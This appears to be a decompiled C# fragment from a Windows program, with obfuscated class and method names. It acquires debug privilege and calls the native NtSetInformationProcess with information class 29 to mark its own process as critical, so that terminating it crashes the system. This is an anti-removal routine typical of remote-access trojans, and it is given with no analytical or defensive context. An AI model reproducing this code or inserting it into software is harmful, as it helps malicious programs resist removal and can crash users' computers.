using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class7
{
	public class Class8
	{
		[DllImport("ntdll")]
		private static extern int NtSetInformationProcess(IntPtr intptr_0, int int_0, ref int int_1, int int_2);

		public Class8()
		{
			try
			{
				Process.EnterDebugMode();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public void method_0()
		{
			IntPtr handle = Process.GetCurrentProcess().Handle;
			int int_ = 1;
			NtSetInformationProcess(handle, 29, ref int_, Marshal.SizeOf((object)1));
		}

		void object.Finalize()
		{
			base.Finalize();
		}
	}

	public static bool bool_0;

	public static bool bool_1;

	public static bool bool_2;

	public static RegistryKey registryKey_0;

	public static string string_0;

	public static string[] string_1;

	public static string string_2;
}
